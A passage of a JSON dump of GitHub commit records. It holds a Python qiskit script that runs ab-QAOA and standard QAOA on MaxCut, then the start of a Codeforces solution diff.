states.append(x)","    result = {}","    result['states'] = states","    result['cost'] = -opt_cost","    return result"]}],"source":"\nimport numpy as np import networkx as nx import matplotlib.pyplot as plt from matplotlib import cm from matplotlib.ticker import LinearLocator, FormatStrFormatter from qiskit import Aer, IBMQ from qiskit import QuantumRegister, ClassicalRegister, QuantumCircuit, transpile, assemble from qiskit.providers.ibmq import least_busy from qiskit.tools.monitor import job_monitor from qiskit.visualization import plot_histogram classical_backend=Aer.get_backend('qasm_simulator') def main(): G=nx.random_regular_graph(3, 6, seed=2) nx.draw_networkx(G, pos=nx.circular_layout(G)) abQAOAfunc=generate_abQAOA_cost_from_para(G, classical_backend, nshots=4) result=full_abQAOA(abQAOAfunc, G, p=5, R=10) print(f'full abQAOA result:{result}') QAOAfunc=generate_QAOA_cost_from_para(G, classical_backend, nshots=4) QAOAres=full_QAOA(QAOAfunc, G, p=5, R=10) print(f'full QAOA result:{QAOAres}') def fourier(uv): \"\"\" Using u and v to compute beta and gamma Args: uv_para: u and v Returns: theta: beta, gamma \"\"\" p=len(uv) \/\/ 2 theta=np.zeros(2 * p) for k in range(0, p): for l in range(1, p +1): theta[p +k] +=uv[l -1] * np.sin((l -1\/2) *((k+1) -1\/2) *(np.pi \/ p)) theta[k] +=uv[p +l -1] * np.cos((l -1\/2) *((k+1) -1\/2) * np.pi \/ p) return theta def get_Euler_angles(beta, h): angles=np.zeros(3) r=(1 +h**2)**0.5 gamma=-np.arctan((h*np.sin(beta))\/(r*np.cos(beta))) angles[0]=2 * np.arccos(((np.cos(beta))**2 +(h**2 *(np.sin(beta))**2 \/ r**2))**0.5) angles[1]=-gamma -np.pi\/2 angles[2]=-gamma +np.pi\/2 return angles def create_abQAOA_circ(G, para): \"\"\" Creates a parametrized qaoa circuit Args: G: networkx graph para: u, v and h Returns: qc: qiskit circuit \"\"\" nqubits=len(G.nodes()) qc=QuantumCircuit(nqubits) theta=fourier(para[:-nqubits]) p=len(theta)\/\/2 beta=theta[:p] gamma=theta[p:] h=para[-nqubits:] for i in range(0, nqubits): initial_vector=np.array([1, h[i] -(1 +h[i]**2)**0.5]) initial_vector \/=np.linalg.norm(initial_vector) qc.initialize(initial_vector, i) qc.barrier() for irep in range(0, p): for pair in list(G.edges()): qc.rzz(2 * gamma[irep], pair[0], pair[1]) qc.barrier() for i in range(0, nqubits): angles=get_Euler_angles(beta[irep], h[i]) qc.u(angles[0], angles[1], angles[2], i) qc.measure_all() return qc def create_qaoa_circ(G, para): \"\"\" Creates a parametrized qaoa circuit Args: G: networkx graph para: u and v Returns: qc: qiskit circuit \"\"\" nqubits=len(G.nodes()) theta=fourier(para) p=len(theta)\/\/2 qc=QuantumCircuit(nqubits) beta=theta[:p] gamma=theta[p:] for i in range(0, nqubits): qc.h(i) for irep in range(0, p): for pair in list(G.edges()): qc.rzz(2 * gamma[irep], pair[0], pair[1]) for i in range(0, nqubits): qc.rx(2 * beta[irep], i) qc.measure_all() return qc def cost_expectation(counts, G): \"\"\" Computes expectation value based on measurement results Args: counts: dict key as bitstring, val as count G: networkx graph Returns: avg: float expectation value \"\"\" avg=0 sum_count=0 for bitstring, count in counts.items(): obj=cost_function_C(bitstring, G) avg +=obj * count sum_count +=count res=avg\/sum_count res=-res return res def cost_function_C(x,G, weight=False): \"\"\" Given a bitstring as a solution, this function returns the cost function of a weighted graph Args: x: str solution bitstring G: networkx graph with weight weight: if weighted graph Returns: C: int value of cost function We may want to maximaze this function \"\"\" E=G.edges() if( len(x) !=len(G.nodes())): return np.nan C=0; for index in E: e1=index[0] e2=index[1] if weight==True: w=G[e1][e2]['weight'] C=C +w* int(x[e1]) *(1-int(x[e2])) +w* int(x[e2]) *(1-int(x[e1])) else: C=C +int(x[e1]) *(1-int(x[e2])) +int(x[e2]) *(1-int(x[e1])) return C def Z_expectation(counts): \"\"\" Computes <Z> from counts, the result from a backend Args: counts: dict key as bitstring, val as count Returns: Z: list of floats of length nqubits, the expectation value of Z for each qubit \"\"\" total_count=0 Z=np.zeros(len(list(counts.keys())[0])) for bitstring, count in counts.items(): total_count +=count for i in range(len(bitstring)): if bitstring[i]=='1': Z[i] +=count Z \/=total_count return Z def Cloning(li1): li_copy=li1[:] return li_copy def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon=1e-8): \"\"\" Adam optimization algprithm especially written for ab-QAOA Args: func: need to be able to calculate <Z>, <E> and grad initial_paras: initial parameters u, v and h alpha: stepsize beta1, beta 2:[0,1) exponential decay rates for moment estimates Returns: dict with keys 'cost', 'para', 'N_ite' \"\"\" t=0 m_prev=np.zeros(2*p) v_prev=np.zeros(2*p) h=initial_para[2*p:] nqubits=len(G.nodes()) E_prev=-nqubits para=Cloning(initial_para) while(True): t +=1 res=get_gradient(func, para, p, eps=1e-8) E=res['E'] if(abs(E -E_prev) < 1e-6 or t==500): break g=res['grad'] m=beta1 * m_prev +(1 -beta1) * g v=beta2 * v_prev +(1 -beta2) * g**2 alpha_t=alpha *(1 -beta2**t)**0.5 \/(1 -beta1**t) para[0:2*p] -=alpha_t * m \/(v**0.5 +epsilon) if len(h) > 0: Z=Z_expectation(res['counts']) if(len(Z) !=len(h)): print('Error: length of h does not match <Z>') else: for i in range(len(h)): h[i] -=1.1 *(h[i] -Z[i]) para[2*p:]=h m_prev=m v_prev=v E_prev=E result={} result['counts']=res['counts'] result['cost']=E result['para']=para result['N_ite']=t return result def generate_abQAOA_cost_from_para(G, backend, nshots=1): \"\"\" A function used in optimization process G: graph para: u, v, h backend: local simulation or ibmq return: a function that takes para and returns cost \"\"\" def execute_circ(para): qc=create_abQAOA_circ(G, para) counts=backend.run(qc, shots=nshots).result().get_counts() result={} result['counts']=counts result['E']=cost_expectation(counts, G) return result return execute_circ def generate_QAOA_cost_from_para(G, backend, nshots=1): \"\"\" A function used in optimization process G: graph para: u, v, h backend: local simulation or ibmq return: a function that takes para and returns cost \"\"\" def execute_circ(para): qc=create_qaoa_circ(G, para) counts=backend.run(qc, shots=nshots).result().get_counts() result={} result['counts']=counts result['E']=cost_expectation(counts, G) return result return execute_circ def get_gradient(func, para, p, eps=1e-8): \"\"\" Calculate gradient of func wrt u, v Args: func: takes paras and return cost function value(energy) and state counts para: u, v, h func(para) is the cost function. We want to compute gradient of func wrt u v p: level; length of u, v Returns: gradient of func w.r.t elements in u and v \"\"\" grad=np.zeros(2 * p) res=func(para) E=res['E'] for i in range(0, 2*p): para_i=Cloning(para) para_i[i] +=eps E_i=func(para_i)['E'] grad[i]=(E_i -E) \/ eps result={} result['grad']=grad result['E']=E result['counts']=res['counts'] return result from numpy.random import choice from numpy.random import normal def initialize_h(nqubits, method='PosNegOnes'): \"\"\" Initialize h Args: method: 'AllOnes' 'PosNegOnes' 'Normal' Returns: initial value of h, size of nqubits \"\"\" if method=='AllOnes': return np.ones(nqubits) elif method=='Normal': return normal(loc=0, scale=1, size=nqubits) elif method=='PosNegOnes': return[choice([1, -1]) for i in range(nqubits)] else: print('Please use a valid method') return def full_abQAOA(func, G, p, R=10): \"\"\" Run full abQAOA on graph G Args: G: networkx graph p: intended level of the circuit R: random states Returns: result: a dict with keys 'counts': measurement result counts from each level, a list of dict 'para': best parameters from each level 'cost': best cost from each level \"\"\" nqubits=len(G.nodes()) best_paras=[] best_costs=[] best_counts=[] paras=[] for i in range(0, R): theta=normal(loc=0, scale=1, size=2) h=initialize_h(nqubits) para=np.concatenate([theta, h]) paras.append(para) best_para=[] best_cost=0 best_result={} for para in paras: print('initial parameters:') print(para) result=Adam_abQAOA(func, para, G, p=1) print('Adam Result:') print(result) if result['cost'] < best_cost: best_cost=result['cost'] best_para=result['para'] best_result=result print('best para for p=1') print(best_para) best_paras.append(best_para[:]) best_costs.append(best_cost) best_counts.append(best_result['counts']) best_u=best_para[:1] best_v=best_para[1:2] best_h=best_para[2:] for cur_level in range(2, p +1): print() print(f'current level:{cur_level}') print() paras=[] u=np.append(best_u, 0) v=np.append(best_v, 0) h=best_h para=np.concatenate([u, v, h]) paras.append(para) for i in range(1, R): u=(best_u +0.6*normal(loc=0.0, scale=abs(best_u))) v=(best_v +0.6*normal(loc=0.0, scale=abs(best_v))) u=np.append(u, 0) v=np.append(v, 0) h=best_h +0.6*normal(loc=0.0, scale=abs(best_h)) para=np.concatenate([u, v, h]) paras.append(para) best_para=[] best_cost=0 best_result={} for para in paras: print('parameters:') print(para) result=Adam_abQAOA(func, para, G, p=cur_level) print('Adam result') print(result) if result['cost'] < best_cost: best_cost=result['cost'] best_para=result['para'] best_result=result best_u=best_para[:cur_level] best_v=best_para[cur_level:2*cur_level] best_h=best_para[2*cur_level:] print(f'best result for level{cur_level}') print(best_result) best_paras.append(best_para[:]) best_costs.append(best_cost) best_counts.append(best_result['counts']) result={} result['counts']=best_counts result['para']=best_paras result['cost']=best_costs return result def full_QAOA(func, G, p, R=10): \"\"\" Run full abQAOA on graph G Args: G: networkx graph p: intended level of the circuit R: random states Returns: result: a dict with keys 'counts': final state 'para': best parameters from each level 'cost': measurement result counts from each level, a list of dict \"\"\" nqubits=len(G.nodes()) best_paras=[] best_costs=[] best_counts=[] paras=[] for i in range(0, R): theta=normal(loc=0, scale=1, size=2) h=[] para=np.concatenate([theta, h]) paras.append(para) best_para=[] best_cost=0 best_result={} for para in paras: print('initial parameters:') print(para) result=Adam_abQAOA(func, para, G, p=1) print('Adam Result:') print(result) if result['cost'] < best_cost: best_cost=result['cost'] best_para=result['para'] best_result=result print('best para for p=1') print(best_para) best_paras.append(best_para[:]) best_costs.append(best_cost) best_counts.append(best_result['counts']) best_u=best_para[:1] best_v=best_para[1:2] best_h=best_para[2:] for cur_level in range(2, p +1): print() print(f'current level:{cur_level}') print() paras=[] u=np.append(best_u, 0) v=np.append(best_v, 0) h=best_h para=np.concatenate([u, v, h]) paras.append(para) for i in range(1, R): u=(best_u +0.6*normal(loc=0.0, scale=abs(best_u))) v=(best_v +0.6*normal(loc=0.0, scale=abs(best_v))) u=np.append(u, 0) v=np.append(v, 0) h=best_h +0.6*normal(loc=0.0, scale=abs(best_h)) para=np.concatenate([u, v, h]) paras.append(para) best_para=[] best_cost=0 best_result={} for para in paras: print('parameters:') print(para) result=Adam_abQAOA(func, para, G, p=cur_level) print('Adam result') print(result) if result['cost'] < best_cost: best_cost=result['cost'] best_para=result['para'] best_result=result best_u=best_para[:cur_level] best_v=best_para[cur_level:2*cur_level] best_h=best_para[2*cur_level:] print(f'best result for level{cur_level}') print(best_result) best_paras.append(best_para[:]) best_costs.append(best_cost) best_counts.append(best_result['counts']) result={} result['counts']=best_counts result['para']=best_paras result['cost']=best_costs return result main() ","sourceWithComments":"import numpy as np\nimport networkx as nx  # tool to handle general Graphs \nimport matplotlib.pyplot as plt \nfrom matplotlib import cm\nfrom matplotlib.ticker import LinearLocator, FormatStrFormatter\n\nfrom qiskit import Aer, IBMQ\nfrom qiskit import QuantumRegister, ClassicalRegister, QuantumCircuit, transpile, assemble\nfrom qiskit.providers.ibmq import least_busy\nfrom qiskit.tools.monitor import job_monitor\nfrom qiskit.visualization import plot_histogram\n\nclassical_backend = Aer.get_backend('qasm_simulator')\n\n# # Authenticate an account and add for use during this session. Replace string argument with your private token.\n\n# IBMQ.enable_account('your ibm token here')\n\n# # To store your credentials locally you can run:\n\n# IBMQ.save_account(\"your ibm token here\",overwrite=True)\n\n# my_provider = IBMQ.get_provider()\n\n# quantum_backend = my_provider.get_backend('ibmq_qasm_simulator')\n\n\ndef main():\n    # A test example, to be replaced by analysis we want to perform\n    # nx module for u3r graph generation\n    G = nx.random_regular_graph(3, 6, seed = 2)\n    nx.draw_networkx(G, pos = nx.circular_layout(G))\n    # plt.savefig('network.jpg')\n    # A sample test \n    abQAOAfunc = generate_abQAOA_cost_from_para(G, classical_backend, nshots = 4)\n    result = full_abQAOA(abQAOAfunc, G, p=5, R = 10)\n    print(f'full abQAOA result: {result}')\n        \n    QAOAfunc = generate_QAOA_cost_from_para(G, classical_backend, nshots = 4)\n    QAOAres = full_QAOA(QAOAfunc, G, p=5, R = 10)\n    print(f'full QAOA result: {QAOAres}')\n\n\n\n# # Alternative way to generate graph\n# n = 6\n# V = np.arange(0,n,1)\n# E =[(0,1,1.0),(0,2,1.0),(0,5,1.0), (1,2,1.0),(1,4,1.0), (2,3,1.0),(3,4,1.0),(3,5,1.0),(4,5,1.0),(5,0,1.0)] \n\n# G = nx.Graph()\n# G.add_nodes_from(V)\n# G.add_weighted_edges_from(E)\n\n# # Generate plot of the Graph\n# colors       = ['r' for node in G.nodes()]\n# default_axes = plt.axes(frameon=True)\n# pos          = nx.circular_layout(G)\n\n# nx.draw_networkx(G, node_color=colors, node_size=600, alpha=1, ax=default_axes, pos=pos)\n# # plt.savefig('network.jpg')\n\n\n# ## generate circuit\n\ndef fourier(uv):\n    \n    \"\"\"\n    Using u and v to compute beta and gamma\n    Args:  \n        uv_para: u and v\n        \n                     \n    Returns:\n        theta: beta, gamma\n    \"\"\"\n    \n    p = len(uv) \/\/ 2  \n    theta = np.zeros(2 * p)    \n    for k in range (0, p):\n        for l in range(1, p + 1):\n            theta[p + k] += uv[l - 1] * np.sin((l - 1\/2) * ((k+1) - 1\/2) * (np.pi \/ p) )      \n            theta[k]  += uv[p + l - 1] * np.cos((l - 1\/2) * ((k+1) - 1\/2) * np.pi \/ p)     \n    \n    return theta\n\n\n\ndef get_Euler_angles(beta, h):\n    angles = np.zeros(3)\n    r = (1 + h**2)**0.5\n    gamma = - np.arctan((h*np.sin(beta))\/(r*np.cos(beta)))\n    angles[0] = 2 * np.arccos(((np.cos(beta))**2 + (h**2 * (np.sin(beta))**2 \/ r**2))**0.5)   \n    angles[1] = - gamma - np.pi\/2\n    angles[2] = - gamma + np.pi\/2\n      \n    return angles\n\n\n\n\ndef create_abQAOA_circ(G, para):\n    \n    \"\"\"\n    Creates a parametrized qaoa circuit\n    \n    Args:  \n        G: networkx graph\n        para: u, v and h\n                     \n    Returns:\n        qc: qiskit circuit\n    \"\"\"\n    \n    nqubits = len(G.nodes())\n     # number of alternating unitaries\n    \n    qc = QuantumCircuit(nqubits)\n    \n    theta = fourier(para[:-nqubits])\n    p = len(theta)\/\/2 \n    \n    beta = theta[:p]\n    gamma = theta[p:]\n    h = para[-nqubits:]\n    \n    \n    \n    # initial_state    \n    # C [| 0 > + ( h - \\sqrt{1+h^2} ) |1 > ] \n    # Where c is normalization constant\n    for i in range(0, nqubits):\n        initial_vector = np.array([1, h[i] - (1 + h[i]**2)**0.5])\n        initial_vector \/= np.linalg.norm(initial_vector)\n        qc.initialize(initial_vector, i)\n    qc.barrier()\n    # Quantum gates\n    for irep in range(0, p):        \n        # problem unitary\n        for pair in list(G.edges()):\n            qc.rzz(2 * gamma[irep], pair[0], pair[1])\n        qc.barrier()\n        # mixer unitary = exp [ib (X - hZ) ]\n        # Todo\n        for i in range(0, nqubits):\n            angles = get_Euler_angles(beta[irep], h[i])\n            qc.u(angles[0], angles[1], angles[2], i)\n            \n    qc.measure_all()\n        \n    return qc\n\n\n\n\ndef create_qaoa_circ(G, para):\n    \n    \"\"\"\n    Creates a parametrized qaoa circuit\n    \n    Args:  \n        G: networkx graph\n        para: u and v\n                     \n    Returns:\n        qc: qiskit circuit\n    \"\"\"\n    \n    nqubits = len(G.nodes())\n    theta = fourier(para)\n    p = len(theta)\/\/2  # number of alternating unitaries\n    qc = QuantumCircuit(nqubits)\n    \n    \n    beta = theta[:p]\n    gamma = theta[p:]\n    \n    # initial_state\n    for i in range(0, nqubits):\n        qc.h(i)\n    \n    for irep in range(0, p):\n        \n        # problem unitary\n        for pair in list(G.edges()):\n            qc.rzz(2 * gamma[irep], pair[0], pair[1])\n\n        # mixer unitary\n        for i in range(0, nqubits):\n            qc.rx(2 * beta[irep], i)\n            \n    qc.measure_all()\n        \n    return qc\n\n\n# Cost function from bitstring or counts; expectation of Z\ndef cost_expectation(counts, G):\n    \n    \"\"\"\n    Computes expectation value based on measurement results\n    \n    Args:\n        counts: dict\n                key as bitstring, val as count\n           \n        G: networkx graph\n        \n    Returns:\n        avg: float\n             expectation value\n    \"\"\"\n    \n    avg = 0\n    sum_count = 0\n    for bitstring, count in counts.items():\n        \n        obj = cost_function_C(bitstring, G)\n        avg += obj * count\n        sum_count += count\n        res = avg\/sum_count\n#         want to minimize function \n        res = -res\n    return res\n\ndef cost_function_C(x,G, weight = False):\n    \"\"\"\n    Given a bitstring as a solution, this function returns\n    the cost function of a weighted graph\n    \n    Args:\n        x: str\n           solution bitstring\n           \n        G: networkx graph with weight\n\n        weight: if weighted graph\n        \n    Returns:\n        C: int\n            value of cost function\n        We may want to maximaze this function\n    \"\"\"\n    \n    E = G.edges()\n    if( len(x) != len(G.nodes())):\n        return np.nan\n        \n    C = 0;\n    for index in E:\n        e1 = index[0]\n        e2 = index[1]\n        if weight == True:\n            w = G[e1][e2]['weight']\n            C = C + w* int(x[e1]) *(1- int(x[e2]) ) + w* int(x[e2]) *(1- int(x[e1]) )\n        else:\n            C = C + int(x[e1]) *(1- int(x[e2]) ) + int(x[e2]) *(1- int(x[e1]) )\n    return C\n\ndef Z_expectation(counts):\n    \"\"\"\n    Computes <Z> from counts, the result from a backend\n    \n    Args:\n        counts: dict\n                key as bitstring, val as count\n        \n    Returns:\n        Z: list of floats of length nqubits, \n        the expectation value of Z for each qubit\n    \"\"\"    \n    total_count = 0\n    Z = np.zeros(len(list(counts.keys())[0]))\n    for bitstring, count in counts.items():\n        total_count += count\n        for i in range(len(bitstring)):\n            if bitstring[i] == '1':\n                Z[i] += count\n    Z \/= total_count\n    return Z\n\n\n# ### optimization\n\n\n\ndef Cloning(li1):\n    li_copy = li1[:]\n    return li_copy\n\n# func = generate_cost_from_para(G, para, backend)\n\ndef Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8):\n    \"\"\"\n    Adam optimization algprithm especially written for ab-QAOA\n    \n    Args:  \n        func: need to be able to calculate <Z>, <E> and grad\n        initial_paras: initial parameters u, v and h\n        alpha: stepsize\n        beta1, beta 2: [0,1) exponential decay rates for moment estimates\n                     \n    Returns:\n        dict with keys 'cost', 'para', 'N_ite' \n    \"\"\"   \n# Initialization\n    # number of iteration\n    t = 0 \n    # 1st moment\n    m_prev = np.zeros(2*p)\n    #second moment\n    v_prev = np.zeros(2*p)\n      \n    # may be [] so work for ab\/QAOA\n    h = initial_para[2*p:] \n#     print(len(h))\n    nqubits = len(G.nodes())\n    E_prev = -nqubits\n    para = Cloning(initial_para)\n    # theta = [beta, gamma] = para[0:2*p - 1]\n    \n\n    while (True):\n        t += 1\n        \n        res = get_gradient(func, para, p, eps=1e-8)\n        # keys of result: 'grad', 'E', 'counts'\n        E = res['E']\n\n#         print(E)\n        # Set max n of ite to 500 here\n        if (abs(E - E_prev) < 1e-6 or t == 500):\n            break\n        g = res['grad']\n        m = beta1 * m_prev + (1 - beta1) * g\n        v = beta2 * v_prev + (1 - beta2) * g**2 \n        alpha_t = alpha * (1 - beta2**t)**0.5 \/ (1 - beta1**t)\n        para[0:2*p] -= alpha_t * m \/ (v**0.5 + epsilon)\n        \n#         print(result['counts'])\n        \n        if len(h) > 0:\n            Z = Z_expectation(res['counts'])\n            # There will be only one bitstring\n            if (len(Z) != len(h)):\n                print('Error: length of h does not match <Z>')\n            else:\n                for i in range(len(h)):\n                    # 1.1 is learning rate for h\n                    h[i] -= 1.1 * (h[i] - Z[i])  \n            para[2*p:] = h\n        \n        m_prev = m\n        v_prev = v\n        E_prev = E\n\n       \n    result = {}\n    result['counts'] = res['counts']\n    result['cost'] = E\n    result['para'] = para\n    result['N_ite'] = t\n    return result\n\n# This will be 'func' in get_gradient and Adam\ndef generate_abQAOA_cost_from_para(G, backend, nshots = 1):\n    \"\"\"\n    A function used in optimization process\n    \n        G: graph\n    \n        para: u, v, h\n        \n        backend: local simulation or ibmq\n        \n    return: \n        a function that takes para and returns cost\n    \n    \n    \"\"\"\n    def execute_circ(para):\n        qc = create_abQAOA_circ(G, para)\n        counts = backend.run(qc, shots = nshots).result().get_counts()\n        result = {}\n        result['counts'] = counts\n        result['E'] = cost_expectation(counts, G)\n        return result\n    \n    return execute_circ\n\n# This will be 'func' in get_gradient and Adam\ndef generate_QAOA_cost_from_para(G, backend, nshots = 1):\n    \"\"\"\n    A function used in optimization process\n    \n        G: graph\n    \n        para: u, v, h\n        \n        backend: local simulation or ibmq\n        \n    return: \n        a function that takes para and returns cost\n    \n    \n    \"\"\"\n    def execute_circ(para):\n        qc = create_qaoa_circ(G, para)\n        counts = backend.run(qc, shots = nshots).result().get_counts()\n        result = {}\n        result['counts'] = counts\n        result['E'] = cost_expectation(counts, G)\n        return result\n    \n    return execute_circ\n\n\ndef get_gradient(func, para, p, eps=1e-8):\n    \"\"\"\n    Calculate gradient of func wrt u, v\n    \n    Args:  \n        func: takes paras and return cost function value (energy) and state counts\n        para: u, v, h\n        func(para) is the cost function. We want to compute gradient of func wrt u v\n        \n        p: level; length of u, v\n        \n                     \n    Returns:\n        gradient of func w.r.t elements in u and v\n    \"\"\" \n#     theta = [beta, gamma]\n    \n    grad = np.zeros(2 * p)\n    res = func(para)\n    E = res['E']\n    \n    for i in range(0, 2*p):\n        para_i = Cloning(para)\n        para_i[i] += eps\n        E_i = func(para_i)['E']\n        grad[i] = (E_i - E) \/ eps\n        \n    result = {}\n    result['grad'] = grad\n    result['E'] = E\n    result['counts'] = res['counts']\n        \n    return result\n\n\n# ## full outer loop\n\n\nfrom numpy.random import choice\nfrom numpy.random import normal\ndef initialize_h(nqubits, method = 'PosNegOnes'):\n    \"\"\"\n    Initialize h\n    \n    Args:  \n        method:\n            'AllOnes'\n            'PosNegOnes'\n            'Normal'\n    Returns:\n        initial value of h, size of nqubits  \n    \"\"\"\n    if method == 'AllOnes':\n        return np.ones(nqubits)\n    elif method == 'Normal':\n        return normal(loc=0, scale=1, size=nqubits)\n    elif method == 'PosNegOnes':\n        return [choice([1, -1]) for i in range(nqubits)]   \n    else:\n        print('Please use a valid method')\n        return\n    \n\ndef full_abQAOA(func, G, p, R = 10):\n    \"\"\"\n    Run full abQAOA on graph G\n    \n    Args:  \n        G: networkx graph\n        p: intended level of the circuit\n        R: random states\n                     \n    Returns:\n        result: a dict with keys \n            'counts': measurement result counts from each level, a list of dict\n            'para': best parameters from each level\n            'cost': best cost from each level\n    \"\"\"\n#     Initialization\n    nqubits = len(G.nodes())\n    # List of best result of each level\n    best_paras = []\n    best_costs = []\n    best_counts = []\n# p = 1\n    # paras: R list of list of parameters\n    paras = [] \n    for i in range(0, R):\n        theta = normal(loc=0, scale=1, size=2)\n        h = initialize_h(nqubits)\n        para = np.concatenate([theta, h])\n        paras.append(para)\n    \n    best_para = []\n    best_cost = 0\n    best_result = {}\n\n    for para in paras:\n        print('initial parameters:')\n        print(para)\n    # Adam\n        result = Adam_abQAOA(func, para, G, p=1)\n        print('Adam Result:')\n        print(result)\n        if result['cost'] < best_cost:\n            best_cost = result['cost'] \n            best_para = result['para']\n            best_result = result\n\n            \n    print('best para for p = 1')\n    print(best_para)\n    best_paras.append(best_para[:])\n    best_costs.append(best_cost)\n    best_counts.append(best_result['counts'])\n    \n    best_u = best_para[:1]\n    best_v = best_para[1:2]\n    best_h = best_para[2:]\n#     p > 1\n    for cur_level in range(2, p + 1):\n        # paras: R list of list of parameters\n        print()\n        print(f'current level: {cur_level}')\n        print()\n        \n        paras = [] \n        # s = 1\n        u = np.append(best_u, 0)\n        v = np.append(best_v, 0)\n        h = best_h\n        para = np.concatenate([u, v, h])\n        paras.append(para)\n        # s = 2 to R\n        for i in range(1, R):\n            u = (best_u + 0.6*normal(loc=0.0, scale = abs(best_u)))\n            v = (best_v + 0.6*normal(loc=0.0, scale = abs(best_v)))\n            u = np.append(u, 0)\n            v = np.append(v, 0)\n            h = best_h + 0.6*normal(loc=0.0, scale = abs(best_h))\n            para = np.concatenate([u, v, h])\n            paras.append(para)\n\n        best_para = []\n        best_cost = 0\n        best_result = {}\n        # Adam\n        for para in paras:    \n            print('parameters:')\n            print(para)\n            result = Adam_abQAOA(func, para, G, p=cur_level)\n            print('Adam result')\n            print(result)\n            \n            if result['cost'] < best_cost:\n                best_cost = result['cost'] \n                best_para = result['para']\n                best_result = result\n        best_u = best_para[:cur_level]\n        best_v = best_para[cur_level:2*cur_level]\n        best_h = best_para[2*cur_level:] \n        print(f'best result for level {cur_level}')\n        print(best_result)\n        best_paras.append(best_para[:])\n        best_costs.append(best_cost)\n        best_counts.append(best_result['counts'])\n                \n#     now we have best optimized parameters \n    result = {}\n    result['counts'] = best_counts\n    result['para'] = best_paras\n    result['cost'] = best_costs\n    return result\n\n    \n\n\ndef full_QAOA(func, G, p, R = 10):\n    \"\"\"\n    Run full abQAOA on graph G\n    \n    Args:  \n        G: networkx graph\n        p: intended level of the circuit\n        R: random states\n                     \n    Returns:\n        result: a dict with keys \n            'counts': final state\n            'para': best parameters from each level\n            'cost': measurement result counts from each level, a list of dict\n    \"\"\"\n#     Initialization\n    nqubits = len(G.nodes())\n    # List of best result of each level\n    best_paras = []\n    best_costs = []\n    best_counts = []\n# p = 1\n    # paras: R list of list of parameters\n    paras = [] \n    for i in range(0, R):\n        theta = normal(loc=0, scale=1, size=2)\n        h = []\n        para = np.concatenate([theta, h])\n        paras.append(para)\n    \n    best_para = []\n    best_cost = 0\n    best_result = {}\n\n    for para in paras:\n        print('initial parameters:')\n        print(para)\n    # Adam\n        result = Adam_abQAOA(func, para, G, p=1)\n        print('Adam Result:')\n        print(result)\n        if result['cost'] < best_cost:\n            best_cost = result['cost'] \n            best_para = result['para']\n            best_result = result\n\n            \n    print('best para for p = 1')\n    print(best_para)\n    best_paras.append(best_para[:])\n    best_costs.append(best_cost)\n    best_counts.append(best_result['counts'])\n    \n    best_u = best_para[:1]\n    best_v = best_para[1:2]\n    best_h = best_para[2:]\n#     p > 1\n    for cur_level in range(2, p + 1):\n        # paras: R list of list of parameters\n        print()\n        print(f'current level: {cur_level}')\n        print()\n        \n        paras = [] \n        # s = 1\n        u = np.append(best_u, 0)\n        v = np.append(best_v, 0)\n        h = best_h\n        para = np.concatenate([u, v, h])\n        paras.append(para)\n        # s = 2 to R\n        for i in range(1, R):\n            u = (best_u + 0.6*normal(loc=0.0, scale = abs(best_u)))\n            v = (best_v + 0.6*normal(loc=0.0, scale = abs(best_v)))\n            u = np.append(u, 0)\n            v = np.append(v, 0)\n            h = best_h + 0.6*normal(loc=0.0, scale = abs(best_h))\n            para = np.concatenate([u, v, h])\n            paras.append(para)\n\n        best_para = []\n        best_cost = 0\n        best_result = {}\n        # Adam\n        for para in paras:    \n            print('parameters:')\n            print(para)\n            result = Adam_abQAOA(func, para, G, p=cur_level)\n            print('Adam result')\n            print(result)\n            \n            if result['cost'] < best_cost:\n                best_cost = result['cost'] \n                best_para = result['para']\n                best_result = result\n        best_u = best_para[:cur_level]\n        best_v = best_para[cur_level:2*cur_level]\n        best_h = best_para[2*cur_level:] \n        print(f'best result for level {cur_level}')\n        print(best_result)\n        best_paras.append(best_para[:])\n        best_costs.append(best_cost)\n        best_counts.append(best_result['counts'])\n                \n#     now we have best optimized parameters \n    result = {}\n    result['counts'] = best_counts\n    result['para'] = best_paras\n    result['cost'] = best_costs\n    return result\n\nmain()\n\n"}},"msg":"Updated abQAOA.py, added brute force solver for MaxCut; use nshots = -1 and statevector backend to do exact simulation"}},"https:\/\/github.com\/iamheavymetalx7\/Contest-Codeforces-and-Atcoder":{"77818358cd846aece4bd640a0c2c681e50384adc":{"url":"https:\/\/api.github.com\/repos\/iamheavymetalx7\/Contest-Codeforces-and-Atcoder\/commits\/77818358cd846aece4bd640a0c2c681e50384adc","html_url":"https:\/\/github.com\/iamheavymetalx7\/Contest-Codeforces-and-Atcoder\/commit\/77818358cd846aece4bd640a0c2c681e50384adc","message":"Add solution for problem `F - Range Update Point Query`\nLink: https:\/\/codeforces.com\/contest\/1791\/problem\/F\nTags: binary search, brute force, data structures, *1500\nRef: https:\/\/codeforces.com\/contest\/1791\/submission\/192103912","sha":"77818358cd846aece4bd640a0c2c681e50384adc","keyword":"brute force update","diff":"diff --git a\/codeforces\/1791\/F.py b\/codeforces\/1791\/F.py\nindex 8cd234f..6d0dda4 100644\n--- a\/codeforces\/1791\/F.py\n+++ b\/codeforces\/1791\/F.py\n@@ -1,58 +1,21 @@\n-#bisect.bisect_left(a, x, lo=0, hi=len(a)) is the analog of std::lower_bound()\r\n-#bisect.bisect_right(a, x, lo=0, hi=len(a)) is the analog of std::upper_bound()\r\n-#from heapq import heappop,heappush,heapify #heappop(hq), heapify(list)\r\n-#from collections import deque as dq #deque  e.g. myqueue=dq(list)\r\n-#append\/appendleft\/appendright\/pop\/popleft\r\n-#from bisect import bisect as bis #a=[1,3,4,6,7,8] #bis(a,5)-->3\r\n-#import bisect #bisect.bisect_left(a,4)-->2 #bisect.bisect(a,4)-->3\r\n-#import statistics as stat  # stat.median(a), mode, mean\r\n-#from itertools import permutations(p,r)#combinations(p,r)\r\n-#combinations(p,r) gives r-length tuples #combinations_with_replacement\r\n-#every element can be repeated\r\n-        \r\n-import sys, threading, os, io \r\n+import sys\r\n import math\r\n-import time\r\n-from os import path\r\n-from collections import defaultdict, Counter, deque\r\n-from bisect import *\r\n-from string import ascii_lowercase\r\n-from functools import cmp_to_key\r\n-import heapq\r\n+import copy\r\n+import itertools\r\n import bisect\r\n-from io import BytesIO, IOBase\t\t\t\t\t\t\t\t\r\n-\r\n-\r\n-def lcm(a, b):\r\n-    return (a*b)\/\/(math.gcd(a,b))\r\n- \r\n+from heapq import heappop, heappush, heapify\r\n \r\n input = lambda: 